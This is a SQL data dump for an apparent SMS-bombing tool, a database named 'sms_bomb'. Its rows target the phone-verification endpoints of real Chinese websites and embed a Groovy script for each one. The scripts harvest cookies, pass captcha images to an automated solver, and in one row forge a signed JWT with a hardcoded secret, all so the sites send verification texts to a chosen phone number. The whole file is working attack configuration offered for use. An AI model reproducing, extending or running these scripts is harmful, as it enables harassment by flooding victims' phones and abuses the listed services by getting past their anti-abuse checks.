INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (178622728385859584, 'https://www.zgshige.com/img/common/logo_20181219.png', '中国诗歌网', 'https://www.zgshige.com/', 'https://www.zgshige.com/zcms/ajax/invoke', 'Mobile', '{\"_ZVING_METHOD\":\"RealNameAuthentication.sendCode\",\"_ZVING_URL\":\"%2Fzcms%2Fmember%2Fregister\",\"_ZVING_DATA_FORMAT\":\"json\"}', '', '2023-01-15 21:42:57', '2023-01-15 23:41:17', 0, '注册', 'key= _ZVING_STATUS,value=1', '', 1, 'ChinaPoemScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonOutput\nimport org.apache.http.HeaderElement\n\n/**\n * 中国诗歌网\n */\nclass ChinaPoemScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        if (!scriptContext.getHeaderMap().containsKey(\"Cookie\")) {\n            Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n            HttpUtils.get(\"https://www.zgshige.com/zcms/member/register?SiteID=122&Referer=https://www.zgshige.com/\", null, scriptContext.getHeaderMap(), responseHeaderMap)\n            setCookie(responseHeaderMap, scriptContext.getHeaderMap(), true)\n        }\n        def jsonData = [(scriptContext.getSmsUrlConfig().getPhoneParamName()): scriptContext.getParamsMap().get(scriptContext.getSmsUrlConfig().getPhoneParamName()),\n                        UserName                                             : \'AGC3K6K4OE\',\n                        SiteID                                               : \'122\']\n        scriptContext.getParamsMap().remove(scriptContext.getSmsUrlConfig().getPhoneParamName())\n        scriptContext.getParamsMap().put(\"_ZVING_DATA\", JsonOutput.toJson(jsonData))\n    }\n}', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: https://www.zgshige.com/zcms/member/register?SiteID=122&Referer=https%3A%2F%2Fwww.zgshige.com%2F]', 'json', NULL, 1);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (178663148713152512, 'http://passport.sunlands.com/images/pic29.png', '尚德机构', 'https://sunlands.com', 'http://passport.sunlands.com/loginRandCode.action', 'mobile', '{\"nationCode\":\"86\"}', '', '2023-01-16 00:23:34', '2023-01-16 00:49:00', 0, '登录', 'true', 'validateCodeError', 1, 'SunlandsScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport org.apache.http.HeaderElement\n\n/**\n * 尚德机构\n */\nclass SunlandsScript extends SmsCommonScript{\n\n    private String imgUrl = \'http://passport.sunlands.com/imageCode.action\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        step1(scriptContext)\n    }\n\n    private void step1(ScriptContext scriptContext) {\n        def preParamsMap = [rnd: String.valueOf(Math.random())]\n        Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        def inputStream = HttpUtils.getStreaming(imgUrl, preParamsMap, scriptContext.getHeaderMap(), responseHeaderMap)\n        setCookie(responseHeaderMap, scriptContext.getHeaderMap(), true)\n        def imgCaptcha = identifyImgCaptcha(inputStream)\n        scriptContext.getParamsMap().put(\'userValidateCode\', imgCaptcha.toLowerCase())\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: http://passport.sunlands.com/login?service=http%3A%2F%2Fwww.sunlands.com%2Fapi%2Flogin%2Fcas]', 'text', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (178996495234633728, 'https://cdn1-oss-html-site-static.kdjz.com/prod/student-web/assets/images/logo.b956ee7c0aa3831d80e56c53dbd059b1.png', '口袋兼职', 'https://www.kdjz.com/', 'https://api-user-pc.kdjz.com/v1/messages', 'phone', '{\"type\":\"reg\"}', '', '2023-01-16 22:28:10', '2023-01-16 22:52:36', 0, '注册', 'key=success,value=发送短信成功', 'key=errorCode,value=-10422', 1, 'KouDaiJianZhiScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport org.apache.http.HeaderElement\n\n/**\n * 口袋兼职\n */\nclass KouDaiJianZhiScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        step1(scriptContext)\n    }\n\n    private void step1(ScriptContext scriptContext){\n        for (int i = 0; i < 3; i++) {\n            String uuid = UUID.randomUUID().toString()\n            String imgUrl = \"https://api-user-pc.kdjz.com/v1/captcha?type=sms&uuid=${uuid}&_v=${Math.random()}\"\n            Map<String,List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n            def inputStream = HttpUtils.getStreaming(imgUrl, scriptContext.getHeaderMap(), null, responseHeaderMap)\n            def imgCaptcha = identifyImgCaptcha(inputStream)\n            if (imgCaptcha.length() != 4) {\n                continue\n            }\n            scriptContext.getParamsMap().put(\"photoCaptcha\", imgCaptcha.toLowerCase())\n            scriptContext.getParamsMap().put(\"photoUuid\", uuid)\n            return\n        }\n        throw new RuntimeException(\"get Captcha error\")\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[referer: https://www.kdjz.com/]', 'json', NULL, 3);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (179022996487278592, 'https://img.haohaozhu.cn/Op-imageShow/29a65307w02a0kw00q5y11l?iv=1', '好好住', 'https://www.haohaozhu.cn/', 'https://www.haohaozhu.cn/f/y/api/Login/Identifyingcode', 'phone', '{\"country_code\":\"86\",\"identifying_type\":\"1\"}', '', '2023-01-17 00:13:28', '2023-01-17 00:22:34', 0, '登录', '', '', 1, 'HaoHaoZhuScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\n\nimport java.time.LocalDateTime\nimport java.time.ZoneOffset\n\n/**\n * 好好住\n */\nclass HaoHaoZhuScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        setCookie(\"dfg\", getDfg(), scriptContext.getHeaderMap())\n    }\n\n    private static String getDfg(){\n        def t = (LocalDateTime.now().toEpochSecond(ZoneOffset.MIN) * 1000).toString(), n = (int) Math.floor(20 * Math.random()) + 20, r = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\", i = \"\"\n        for (def o = 0; o < n; o++) {\n            i += r[(int) Math.floor(Math.random() * r.length())]\n        }\n        def a = \"\", c = 0, s = 0, u = 0\n        for (; u < n + t.length(); u++) {\n            def l = \"\", f = n / (n + t.length())\n            if (Math.random() < f && c < n || s === t.length()) {\n                l = i[c]\n                c += 1\n            } else {\n                l = t[s]\n                s += 1\n            }\n            a += l\n        }\n        a += t.substring(s)\n        a = n.toString().concat(a)\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: https://www.haohaozhu.cn/]', 'json', NULL, 0);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (179030785255280640, 'https://assets.qschou.com/img/home/logo_20220428.png', '轻松筹', 'https://qschou.com/', 'https://gateway.qschou.com/v3.0.0/activity/nr/sendSms', 'phone', '', '', '2023-01-17 00:44:25', '2023-01-17 00:46:31', 0, '筹款登记', 'key=code,value=0', 'key=code,value=1006', 1, 'QSChouScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\nimport org.apache.http.HeaderElement\n\n/**\n * 轻松筹\n */\nclass QSChouScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        if (!scriptContext.getHeaderMap().containsKey(\"Cookie\")) {\n            Map<String,List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n            HttpUtils.get(\'https://qschou.com/\', null, scriptContext.getHeaderMap(), responseHeaderMap)\n            setCookie(responseHeaderMap, scriptContext.getHeaderMap(), true)\n        }\n        step1(scriptContext)\n    }\n\n    private void step1(ScriptContext scriptContext){\n        String imgUrl = \'https://gateway.qschou.com/v3.0.0/activity/nr/session\'\n        def preParamsMap = [(scriptContext.getSmsUrlConfig().getPhoneParamName()): scriptContext.getParamsMap().get(scriptContext.getSmsUrlConfig().getPhoneParamName()),\n                            r                                                    : Math.random().toString()]\n        def response = HttpUtils.get(imgUrl, preParamsMap, scriptContext.getHeaderMap())\n        def object = new JsonSlurper().parseText(response)\n        def imgCaptcha = identifyImgCaptcha(object[\'data\'][\'captcha\'].toString())\n        scriptContext.getParamsMap().put(\'code\', imgCaptcha.toLowerCase())\n        scriptContext.getParamsMap().put(\'session_id\', object[\'data\'][\'session_id\'].toString())\n    }\n}\n', NULL, 'POST', 'application/json', '[Referer: https://qschou.com/]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (179561827586281472, 'https://m.shouqiev.com/images/gofun_science_logo.png', 'GOFUN出行', 'https://m.shouqiev.com/', 'https://m.shouqiev.com/backendapi/h5/smsCode.json', 'sim', '', '', '2023-01-18 11:54:36', '2023-01-18 17:12:54', 0, '领取红包', 'key=code,value=200', 'key=code,value=2100', 1, 'GoFunScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.jwt.JwtBuilder\nimport com.lei2j.jwt.algorithm.Algorithm\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\nimport org.apache.http.HeaderElement\n\n/**\n * GoFun出行\n */\nclass GoFunScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        long iat = (long) System.currentTimeMillis() / 1000\n        def sign = JwtBuilder.builder().addPublicClaim(\"iss\", \"9wGa0Wyip4Q7BDNdC4d4J0eCmUXTZ1ZO\")\n                .addPublicClaim(\"iat\", iat)\n                .addPublicClaim(\"nbf\", iat - 5)\n                .addPublicClaim(\"exp\", iat + 60)\n                .build()\n                .sign(Algorithm.hmacSHA256(\"iOWORRnA1sJ7peVTFk72FgKwmuWHKDPQ\"))\n        scriptContext.getHeaderMap().put(\"AUTHORIZATION\", \"GoFunBearer ${sign}\".toString())\n        step1ForImg(scriptContext)\n        step2VerifyCode(scriptContext)\n        scriptContext.getQueryMap().put(scriptContext.getSmsUrlConfig().getPhoneParamName(), scriptContext.getParamsMap().get(scriptContext.getSmsUrlConfig().getPhoneParamName()).toString())\n    }\n\n    private void step1ForImg(ScriptContext scriptContext) {\n        String imgUrl = \'https://m.shouqiev.com/backendapi/h5/getCode.json\'\n        def preParamsMap = [(scriptContext.getSmsUrlConfig().getPhoneParamName()): scriptContext.getParamsMap().get(scriptContext.getSmsUrlConfig().getPhoneParamName()),\n                            num                                                  : System.currentTimeMillis().toString(),\n                            updateCode                                           : \"0\"]\n        Map<String, List<HeaderElement>> responseHeaderMap = new HashMap<>()\n        def inputStream = HttpUtils.getStreaming(imgUrl, scriptContext.getHeaderMap(), preParamsMap, responseHeaderMap)\n        setCookie(responseHeaderMap, scriptContext.getHeaderMap(), true)\n        def imgCaptcha = identifyImgCaptcha(inputStream)\n        scriptContext.getParamsMap().put(\"picCode\", imgCaptcha.toLowerCase())\n    }\n\n    private void step2VerifyCode(ScriptContext scriptContext) {\n        String verifyCodeUrl = \'https://m.shouqiev.com/backendapi/h5/verifyCheck.json\'\n        Map<String, String> queryMap = new HashMap<>(scriptContext.getParamsMap())\n        def post = HttpUtils.post(verifyCodeUrl, null, queryMap, scriptContext.getHeaderMap(), null)\n        def object = new JsonSlurper().parseText(post)\n        assert object[\'code\'].toString() == \'200\'\n    }\n}\n', NULL, 'POST', 'application/json', '[Referer: https://m.shouqiev.com/]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (179706376853917696, 'https://web.czb365.com/ty/czb-openplatform/images/newHeaderP.png', '能链开放平台', 'https://nlopen.newlink.com/', 'https://openplatformwsgateway.czb365.com/openplatformws/user/send/sendCheckMsgV7/{phone}', 'phone', '', '', '2023-01-18 21:28:59', '2023-01-28 21:43:27', 0, '注册', 'key=code,value=200', '', 1, 'NengLianScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\n\n/**\n * 能链开放平台\n */\nclass NengLianScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        scriptContext.getSmsUrlConfig().setSmsUrl(scriptContext.getSmsUrlConfig().getSmsUrl().replace\n                (\"{${scriptContext.getSmsUrlConfig().getPhoneParamName()}}\", scriptContext.getParamsMap().get\n                        (scriptContext.getSmsUrlConfig().getPhoneParamName()).toString()))\n    }\n}\n', NULL, 'GET', 'application/json', '[accesstoken:undefined][referer:https://nlopen.newlink.com/][accept:application/json, text/plain, */*]', 'json', NULL, 0);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (183337690249302016, 'https://mogucdn.moguyouxi.cn/moguext/mogupc/images/home_head_foot/LOGOcdwy.png', '蘑菇云游', 'https://www.moguyouxi.cn/', 'https://www.moguyouxi.cn/Home/SendVerificationCode', 'phone', '', '', '2023-01-28 21:58:32', '2023-01-28 21:58:32', 0, '登录', 'key=result,value=0', '', 1, 'MoGuYouXiScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport org.apache.http.HeaderElement\n\n/**\n * 蘑菇云游\n */\nclass MoGuYouXiScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        step1(scriptContext)\n    }\n\n    private void step1(ScriptContext scriptContext) {\n        String url = \'https://www.moguyouxi.cn/\'\n        Map<String, List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        HttpUtils.get(url, null, scriptContext.getHeaderMap(), responseHeaderMap)\n        setCookie(responseHeaderMap, scriptContext.getHeaderMap(), true)\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[referer: https://www.moguyouxi.cn/]', 'json', NULL, NULL);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (186252818724687872, 'https://www.51jingying.com/img/qmImg/qm_maLo.png', ' 无忧精英网', 'https://www.51jingying.com/', 'https://passport.51jingying.com/register.php', 'mobilephone', '', '{\"act\":\"sendPhoneCode\",\"usertype\":\"manager\",\"type\":\"5\"}', '2023-02-05 23:02:12', '2023-02-05 23:21:10', 0, '登录', 'key=status,value=100', 'key=status,value=898', 1, 'WuyouJingYIngScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport org.apache.http.HeaderElement\n\n/**\n * 无忧精英\n */\nclass WuyouJingYIngScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        preUrl(scriptContext)\n    }\n\n    private void preUrl(ScriptContext scriptContext){\n        String url = \'https://www.51jingying.com/common/verifycode.php\'\n        Map<String, Object> preMap = new HashMap<>()\n        preMap.put(\"type\", \"2\")\n        preMap.put(\"a\", new Random().nextDouble())\n        Map<String,List<HeaderElement[]>> responseHeaderMap = new HashMap<>()\n        def inputStream = HttpUtils.getStreaming(url, scriptContext.getHeaderMap(), preMap, responseHeaderMap)\n        def imgCaptcha = identifyImgCaptcha(inputStream)\n        List<HeaderElement[]> cookies = responseHeaderMap.get(\'Set-Cookie\')\n        if (cookies) {\n            def iterator = cookies.iterator()\n            while (iterator.hasNext()) {\n                HeaderElement[] next = iterator.next()\n                if (next[0].value == \'deleted\') {\n                    iterator.remove()\n                }\n            }\n        }\n        setCookie(responseHeaderMap, scriptContext.getHeaderMap())\n        scriptContext.getParamsMap().put(\'vcode\', imgCaptcha.toLowerCase())\n    }\n}\n', NULL, 'GET', 'application/json', '[Referer:https://www.51jingying.com/]', 'jsonp', NULL, 2);



